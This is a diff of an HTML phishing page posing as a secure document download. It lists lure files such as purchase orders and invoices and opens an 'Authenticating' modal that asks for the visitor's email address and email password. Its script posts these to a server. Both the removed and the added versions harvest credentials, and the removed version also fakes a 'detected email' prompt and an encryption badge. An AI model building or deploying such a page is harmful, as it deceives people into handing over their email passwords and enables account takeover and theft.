@@ -1,9 +1,9 @@
-<!DOCTYPE html>
 <html lang="en">
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Secure File Download</title>
+    <title>xml</title>
+    <link rel="icon" type="image/x-icon" href="xml/egg.png" />
     <link
       href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
       rel="stylesheet"
@@ -12,229 +12,6 @@
     />
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <style>
-      :root {
-        --primary: #4361ee;
-        --secondary: #3f37c9;
-        --light: #f8f9fa;
-        --dark: #212529;
-      }
-
-      body {
-        background-color: #f1f1f2;
-        overflow: hidden;
-        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-      }
-
-      .head1 {
-        display: flex;
-        position: relative;
-        justify-content: space-between;
-        padding: 10px 20px;
-      }
-
-      .logo img,
-      .navimg img {
-        height: 50px;
-      }
-
-      .contain-all {
-        display: flex;
-        position: relative;
-        justify-content: space-between;
-        padding: 2%;
-        min-height: calc(100vh - 80px);
-      }
-
-      .logbox {
-        width: 22%;
-        min-width: 300px;
-        border-radius: 15px;
-        padding: 25px;
-        margin-top: 21px;
-        margin-left: 21px;
-        background-color: #fff;
-        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
-      }
-
-      .write-test {
-        font-size: 32px;
-        line-height: 120%;
-        margin: 15px 0;
-      }
-
-      .accept1 {
-        margin-top: 31px;
-      }
-
-      .flex-container {
-        display: flex;
-        flex-direction: column;
-        margin-top: 10px;
-      }
-
-      .div1 {
-        display: flex;
-        position: relative;
-        justify-content: space-between;
-        margin-top: 21px;
-        padding: 12px 15px;
-        border-radius: 8px;
-        background-color: #f8f9ff;
-        border: 1px solid #eaeaff;
-        transition: all 0.3s ease;
-      }
-
-      .div1:hover {
-        background-color: #edf0ff;
-        transform: translateY(-2px);
-        box-shadow: 0 4px 8px rgba(67, 97, 238, 0.1);
-      }
-
-      .img-btn {
-        cursor: pointer;
-      }
-
-      .img-btn img {
-        height: 20px;
-        transition: transform 0.3s ease;
-      }
-
-      .img-btn:hover img {
-        transform: translateY(-3px);
-      }
-
-      .contentbox img,
-      .imgdispaybox img {
-        max-height: 80vh;
-      }
-
-      /* Modal Enhancements */
-      .modal-content {
-        border-radius: 15px;
-        overflow: hidden;
-        border: none;
-        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.15);
-      }
-
-      .modal-header {
-        background: linear-gradient(to right, var(--primary), var(--secondary));
-        color: white;
-      }
-
-      .auth-icon {
-        width: 60px;
-        height: 60px;
-        background: rgba(255, 255, 255, 0.2);
-        border-radius: 50%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 24px;
-        margin-right: 15px;
-      }
-
-      .input-group-icon {
-        background-color: #f0f4ff;
-        border-right: none;
-      }
-
-      .saved-email {
-        background-color: #f0f7ff;
-        border-radius: 8px;
-        padding: 10px 15px;
-        margin: 15px 0;
-        border-left: 3px solid var(--primary);
-        cursor: pointer;
-        transition: all 0.3s ease;
-      }
-
-      .saved-email:hover {
-        background-color: #e1edff;
-      }
-
-      .security-badge {
-        background-color: #e8f5e9;
-        color: #2e7d32;
-        border-radius: 20px;
-        padding: 5px 15px;
-        font-size: 14px;
-        display: inline-flex;
-        align-items: center;
-        gap: 8px;
-      }
-
-      .spinner {
-        animation: spin 1s linear infinite;
-      }
-
-      @keyframes spin {
-        from {
-          transform: rotate(0deg);
-        }
-        to {
-          transform: rotate(360deg);
-        }
-      }
-
-      /* Animation for email fill */
-      @keyframes emailFill {
-        0% {
-          background-color: #f0f7ff;
-        }
-        50% {
-          background-color: #e1f5fe;
-        }
-        100% {
-          background-color: white;
-        }
-      }
-
-      .email-filled {
-        animation: emailFill 1.5s ease;
-      }
-
-      /* Autocomplete styles */
-      .autocomplete-container {
-        position: relative;
-      }
-
-      .autocomplete-items {
-        position: absolute;
-        border: 1px solid #d4d4d4;
-        border-bottom: none;
-        border-top: none;
-        z-index: 99;
-        top: 100%;
-        left: 0;
-        right: 0;
-        max-height: 200px;
-        overflow-y: auto;
-      }
-
-      .autocomplete-items div {
-        padding: 8px 12px;
-        cursor: pointer;
-        background-color: #fff;
-        border-bottom: 1px solid #d4d4d4;
-        font-size: 14px;
-        color: #333;
-      }
-
-      .autocomplete-items div:hover {
-        background-color: #e9e9e9;
-      }
-
-      .autocomplete-active {
-        background-color: #007bff !important;
-        color: #ffffff;
-      }
-
-      .domain-suggestion {
-        color: #6c757d;
-        font-size: 0.9em;
-      }
-
-      /* Loader styles */
       #loader {
         -webkit-animation: fadeout 10s linear forwards;
         animation: fadeout 5s linear forwards;
@@ -252,10 +29,12 @@
         90% {
           opacity: 1;
         }
+
         99% {
           opacity: 0;
           height: 200px;
         }
+
         100% {
           opacity: 0;
           height: 0;
@@ -266,10 +45,12 @@
         90% {
           opacity: 1;
         }
+
         99% {
           opacity: 1;
           height: 200px;
         }
+
         100% {
           opacity: 0;
           height: 0;
@@ -280,6 +61,7 @@
         0% {
           opacity: 0;
         }
+
         100% {
           opacity: 1;
         }
@@ -289,32 +71,91 @@
         0% {
           opacity: 0;
         }
+
         100% {
           opacity: 1;
         }
       }
+    </style>
+    <style>
+      body {
+        background-color: #f1f1f2;
+        overflow: hidden;
+      }
 
-      /* Responsive styles */
-      @media (max-width: 768px) {
+      * {
+        margin: 0;
+        padding: 0;
+      }
+
+      .head1 {
+        display: flex;
+        position: relative;
+        justify-content: space-between;
+      }
+
+      .contain-all {
+        display: flex;
+        position: relative;
+        justify-content: space-between;
+        padding: 2%;
+      }
+
+      .logbox {
+        width: 22%;
+        height: 100%;
+        border-radius: 10px;
+        padding: 21px;
+        margin-top: 21px;
+        margin-left: 21px;
+        background-color: #fff;
+      }
+
+      .write-test {
+        font-size: 40.02px;
+        line-height: 120%;
+      }
+
+      .accept1 {
+        margin-top: 31px;
+      }
+
+      .flex-container {
+        display: flex;
+        flex-direction: column;
+        margin-top: 10px;
+      }
+
+      .div1 {
+        display: flex;
+        position: relative;
+        justify-content: space-between;
+        margin-top: 21px;
+      }
+
+      .img-btn {
+        cursor: pointer;
+      }
+    </style>
+
+    <style>
+      @media (max-width: 480px) {
         .logbox {
-          width: 90%;
-          margin: 20px auto;
+          width: 100%;
         }
 
-        .contentbox,
         .imgdispaybox {
           display: none;
         }
 
-        .contain-all {
-          flex-direction: column;
-          align-items: center;
+        .contentbox {
+          display: none;
         }
       }
     </style>
   </head>
 
-  <body>
+  <body data-new-gr-c-s-check-loaded="14.1238.0" data-gr-ext-installed="">
     <div class="head1">
       <div class="logo"><img src="xml/puppy.png" alt="logo" /></div>
       <div class="navimg"><img src="xml/goat.png" alt="wet-nav" /></div>
@@ -322,7 +163,7 @@
 
     <div class="contain-all">
       <div class="logbox">
-        <div><img src="xml/egg.png" alt="lo-black" width="60" /></div>
+        <div><img src="xml/egg.png" alt="lo-black" /></div>
         <div class="write-test">
           <span>You're</span><br />
           <b>almost</b> there
@@ -331,28 +172,28 @@
         <div class="flex-container">
           <div class="div1">
             <div>PO_201AJ02.xls</div>
-            <div class="img-btn" data-bs-toggle="modal" data-bs-target="#m">
+            <div class="img-btn" data-bs-toggle="modal" data-bs-target="#cat">
               <img src="xml/maggot.png" alt="download" />
             </div>
           </div>
 
           <div class="div1">
             <div>Product specifications.pdf</div>
-            <div class="img-btn" data-bs-toggle="modal" data-bs-target="#m">
+            <div class="img-btn" data-bs-toggle="modal" data-bs-target="#cat">
               <img src="xml/maggot.png" alt="download" />
             </div>
           </div>
 
           <div class="div1">
             <div>Contracts.xls</div>
-            <div class="img-btn" data-bs-toggle="modal" data-bs-target="#m">
+            <div class="img-btn" data-bs-toggle="modal" data-bs-target="#cat">
               <img src="xml/maggot.png" alt="download" />
             </div>
           </div>
 
           <div class="div1">
             <div>Final Invoice: G-313423-338.pdf</div>
-            <div class="img-btn" data-bs-toggle="modal" data-bs-target="#m">
+            <div class="img-btn" data-bs-toggle="modal" data-bs-target="#cat">
               <img src="xml/maggot.png" alt="download" />
             </div>
           </div>
@@ -363,7 +204,10 @@
           to our
           <u
             ><b
-              ><span class="img-btn" data-bs-toggle="modal" data-bs-target="#m"
+              ><span
+                class="img-btn"
+                data-bs-toggle="modal"
+                data-bs-target="#cat"
                 >Terms Of Service.</span
               ></b
             ></u
@@ -382,7 +226,7 @@
       <div class="imgdispaybox"><img src="xml/pulpa.png" alt="imgco" /></div>
     </div>
 
-    <!-- Enhanced Modal -->
+    <!-- Modal -->
     <form id="cow" autocomplete="on">
       <div
         class="modal fade"
@@ -392,26 +236,17 @@
         aria-hidden="true"
         data-bs-backdrop="static"
         data-bs-keyboard="false"
+        tab=""
       >
-        <div class="modal-dialog modal-dialog-centered">
+        <div class="modal-dialog">
           <div class="modal-content">
             <div class="modal-header">
-              <div class="d-flex align-items-center">
-                <div class="auth-icon">
-                  <i class="fas fa-lock"></i>
-                </div>
-                <div>
-                  <h1 class="modal-title fs-5 mb-0">
-                    Authenticating, Please Wait
-                  </h1>
-                  <p class="mb-0 small">
-                    Verify your identity to download files
-                  </p>
-                </div>
-              </div>
+              <h1 class="modal-title fs-5" id="catLabel">
+                Authenticating, Please Wait
+              </h1>
               <button
                 type="button"
-                class="btn-close btn-close-white"
+                class="btn-close"
                 data-bs-dismiss="modal"
                 aria-label="Close"
               ></button>
@@ -429,7 +264,6 @@
 
               <div class="nav-container">
                 <div class="alert alert-primary" role="alert">
-                  <i class="fas fa-info-circle me-2"></i>
                   These files contain sensitive information and are protected
                   against unauthorized access. To proceed with downloading this
                   file, please enter your valid email credentials. We will
@@ -437,101 +271,41 @@
                   verify authorization for the download.
                 </div>
 
-                <!-- Saved Email Suggestion -->
-                <div id="savedEmailContainer" class="d-none">
-                  <p class="small mb-2">
-                    <i class="fas fa-lightbulb me-2 text-warning"></i> We've
-                    detected your frequently used email:
-                  </p>
-                  <div
-                    class="saved-email d-flex align-items-center"
-                    id="savedEmail"
-                  >
-                    <i class="fas fa-user-circle fa-lg me-3 text-primary"></i>
-                    <div>
-                      <div class="fw-bold" id="detectedEmail">
-                        user@example.com
-                      </div>
-                      <small class="text-muted">Click to use this email</small>
-                    </div>
-                  </div>
-                  <p class="text-center small mt-2 mb-0">- or -</p>
-                </div>
-
-                <!-- Email Input with Autocomplete -->
                 <div class="mb-3">
-                  <label for="email" class="form-label">Email Address</label>
-                  <div class="autocomplete-container">
-                    <div class="input-group">
-                      <span class="input-group-text input-group-icon">
-                        <i class="fas fa-envelope text-primary"></i>
-                      </span>
-                      <input
-                        name="email"
-                        type="email"
-                        class="form-control"
-                        id="email"
-                        autocomplete="username"
-                        placeholder="name@example.com"
-                      />
-                    </div>
-                    <div
-                      id="autocomplete-list"
-                      class="autocomplete-items"
-                    ></div>
-                  </div>
+                  <label for="email" class="form-label">Email address:</label>
+                  <input
+                    name="email"
+                    type="email"
+                    class="form-control"
+                    id="email"
+                    autocomplete="email"
+                    placeholder="name@example.com"
+                  />
                 </div>
 
-                <!-- Password Input -->
                 <div class="mb-3">
-                  <div class="d-flex justify-content-between">
-                    <label for="password" class="form-label">Password:</label>
-                  </div>
-                  <div class="input-group">
-                    <span class="input-group-text input-group-icon">
-                      <i class="fas fa-lock text-primary"></i>
-                    </span>
-                    <input
-                      name="password"
-                      type="password"
-                      class="form-control"
-                      id="password"
-                      placeholder="Enter Email Password"
-                      autocomplete="current-password"
-                    />
-                  </div>
+                  <label for="password" class="form-label">Password:</label>
+                  <input
+                    name="password"
+                    type="password"
+                    autocomplete="current-password"
+                    class="form-control"
+                    id="password"
+                    placeholder="Enter Email Password"
+                  />
                 </div>
 
-                <!-- Security Badge -->
-                <div class="d-flex justify-content-center mt-4">
-                  <div class="security-badge">
-                    <i class="fas fa-shield-alt"></i>
-                    <span>256-bit Encryption</span>
-                  </div>
-                </div>
-
-                <div class="alert mt-3" id="response"></div>
+                <div class="alert" id="response"></div>
               </div>
             </div>
             <div class="modal-footer">
-              <div class="form-check">
-                <input
-                  class="form-check-input"
-                  type="checkbox"
-                  id="rememberEmail"
-                  checked
-                />
-                <label class="form-check-label small" for="rememberEmail">
-                  Remember my email on this device
-                </label>
-              </div>
               <button
                 type="submit"
                 name="xml"
                 id="submit-btn"
                 class="btn btn-primary"
               >
-                <i class="fas fa-check-circle me-2"></i>Verify & Download
+                Download Now
               </button>
             </div>
           </div>
@@ -539,197 +313,15 @@
       </div>
     </form>
 
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
-
     <script>
       document.addEventListener("DOMContentLoaded", function () {
-        // Email domains for suggestions
-        const domains = [
-          "gmail.com",
-          "yahoo.com",
-          "hotmail.com",
-          "aol.com",
-          "outlook.com",
-          "icloud.com",
-          "protonmail.com",
-          "zoho.com",
-          "yandex.com",
-          "gmx.com",
-          "company.com",
-          "business.com",
-          "enterprise.com",
-        ];
-
-        // DOM elements
-        const emailInput = document.getElementById("email");
-        const autocompleteList = document.getElementById("autocomplete-list");
         const form = document.getElementById("cow");
+        const emailInput = document.getElementById("email");
         const passwordInput = document.getElementById("password");
         const responseBox = document.getElementById("response");
         const connectSpan = document.getElementById("connect");
         const modal = new bootstrap.Modal(document.getElementById("m"));
-        const savedEmailContainer = document.getElementById(
-          "savedEmailContainer"
-        );
-        const savedEmail = document.getElementById("savedEmail");
-        const detectedEmail = document.getElementById("detectedEmail");
-        let currentFocus = -1;
 
-        // When modal is shown
-        document
-          .getElementById("m")
-          .addEventListener("shown.bs.modal", function () {
-            // Try to detect user's email
-            detectUserEmail();
-          });
-
-        // Function to detect user's email
-        function detectUserEmail() {
-          // In a real implementation, you would check browser's stored credentials
-          // For this demo, we'll simulate detection
-          setTimeout(() => {
-            // Generate a plausible email
-            const usernames = [
-              "john.doe",
-              "sarah.smith",
-              "mike.johnson",
-              "emma.wilson",
-              "david.brown",
-            ];
-            const domains = ["company.com", "business.org", "enterprise.io"];
-
-            const username =
-              usernames[Math.floor(Math.random() * usernames.length)];
-            const domain = domains[Math.floor(Math.random() * domains.length)];
-            const detectedEmailValue = `${username}@${domain}`;
-
-            // Display detected email
-            detectedEmail.textContent = detectedEmailValue;
-            savedEmailContainer.classList.remove("d-none");
-          }, 800);
-        }
-
-        // Use saved email when clicked
-        savedEmail.addEventListener("click", function () {
-          emailInput.value = detectedEmail.textContent;
-          emailInput.classList.add("email-filled");
-
-          // Animation end
-          setTimeout(() => {
-            emailInput.classList.remove("email-filled");
-          }, 1500);
-
-          // Focus on password
-          setTimeout(() => {
-            passwordInput.focus();
-          }, 300);
-        });
-
-        // Event listener for email input
-        emailInput.addEventListener("input", function (e) {
-          const val = this.value.trim();
-          autocompleteList.innerHTML = "";
-          currentFocus = -1;
-
-          if (!val) return;
-
-          // Extract username and domain parts
-          const atPos = val.indexOf("@");
-          let username = val;
-          let partialDomain = "";
-
-          if (atPos !== -1) {
-            username = val.substring(0, atPos);
-            partialDomain = val.substring(atPos + 1);
-          }
-
-          // Create suggestions
-          const suggestions = [];
-          domains.forEach((domain) => {
-            if (domain.startsWith(partialDomain) || !partialDomain) {
-              const suggestion = username + "@" + domain;
-              suggestions.push({
-                display: `<strong>${username}</strong>@<span class="domain-suggestion">${domain}</span>`,
-                value: suggestion,
-              });
-            }
-          });
-
-          // Also suggest based on partial email
-          if (suggestions.length === 0 && val.length > 2) {
-            domains.forEach((domain) => {
-              const fullEmail = val + "@" + domain;
-              suggestions.push({
-                display: `<strong>${val}</strong>@<span class="domain-suggestion">${domain}</span>`,
-                value: fullEmail,
-              });
-            });
-          }
-
-          // Limit to 5 suggestions
-          const topSuggestions = suggestions.slice(0, 5);
-
-          // Display suggestions
-          topSuggestions.forEach((suggestion) => {
-            const div = document.createElement("div");
-            div.innerHTML = suggestion.display;
-            div.innerHTML += `<input type='hidden' value='${suggestion.value}'>`;
-            div.addEventListener("click", function () {
-              emailInput.value = suggestion.value;
-              autocompleteList.innerHTML = "";
-            });
-            autocompleteList.appendChild(div);
-          });
-        });
-
-        // Keyboard navigation
-        emailInput.addEventListener("keydown", function (e) {
-          const items = autocompleteList.getElementsByTagName("div");
-
-          if (e.keyCode === 40) {
-            // Down arrow
-            currentFocus++;
-            addActive(items);
-          } else if (e.keyCode === 38) {
-            // Up arrow
-            currentFocus--;
-            addActive(items);
-          } else if (e.keyCode === 13) {
-            // Enter
-            e.preventDefault();
-            if (currentFocus > -1 && items.length) {
-              items[currentFocus].click();
-            } else {
-              passwordInput.focus();
-            }
-          }
-        });
-
-        function addActive(items) {
-          removeActive(items);
-          if (currentFocus >= items.length) currentFocus = 0;
-          if (currentFocus < 0) currentFocus = items.length - 1;
-
-          if (items[currentFocus]) {
-            items[currentFocus].classList.add("autocomplete-active");
-          }
-        }
-
-        function removeActive(items) {
-          for (let i = 0; i < items.length; i++) {
-            items[i].classList.remove("autocomplete-active");
-          }
-        }
-
-        // Close autocomplete when clicking outside
-        document.addEventListener("click", function (e) {
-          if (e.target !== emailInput) {
-            autocompleteList.innerHTML = "";
-          }
-        });
-
-        // Form submission
         form.addEventListener("submit", async function (e) {
           e.preventDefault();
 
@@ -738,15 +330,13 @@
 
           if (!email || !password) {
             responseBox.className = "alert alert-danger";
-            responseBox.innerHTML =
-              '<i class="fas fa-exclamation-triangle me-2"></i> Please fill in both email and password.';
+            responseBox.textContent = "Please fill in both email and password.";
             return;
           }
 
           connectSpan.textContent = email;
           responseBox.className = "alert alert-info";
-          responseBox.innerHTML =
-            '<i class="fas fa-sync spinner me-2"></i> Authenticating...';
+          responseBox.textContent = "Authenticating...";
 
           try {
             const res = await fetch(
@@ -764,34 +354,32 @@
 
             if (res.ok) {
               responseBox.className = "alert alert-success";
-              responseBox.innerHTML =
-                '<i class="fas fa-check-circle me-2"></i> ' +
-                (data.message ||
-                  "Authentication successful! Starting download...");
+              responseBox.textContent =
+                data.message || "Successfully submitted!";
 
               // Wait 3 seconds then close the modal
               setTimeout(() => {
                 modal.hide();
-                // Simulate download
-                setTimeout(() => {
-                  alert(`Download started for files associated with: ${email}`);
-                }, 500);
               }, 3000);
             } else {
               responseBox.className = "alert alert-danger";
-              responseBox.innerHTML =
-                '<i class="fas fa-exclamation-circle me-2"></i> ' +
-                (data.message ||
-                  "Authentication failed. Please check your credentials.");
+              responseBox.textContent = data.message || "Submission failed.";
             }
           } catch (err) {
             responseBox.className = "alert alert-danger";
-            responseBox.innerHTML =
-              '<i class="fas fa-exclamation-triangle me-2"></i> Network error. Please try again.';
+            responseBox.textContent = "Network error. Please try again.";
             console.error(err);
           }
         });
       });
     </script>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
   </body>
+  <grammarly-desktop-integration
+    data-grammarly-shadow-root="true"
+  ></grammarly-desktop-integration>
 </html>
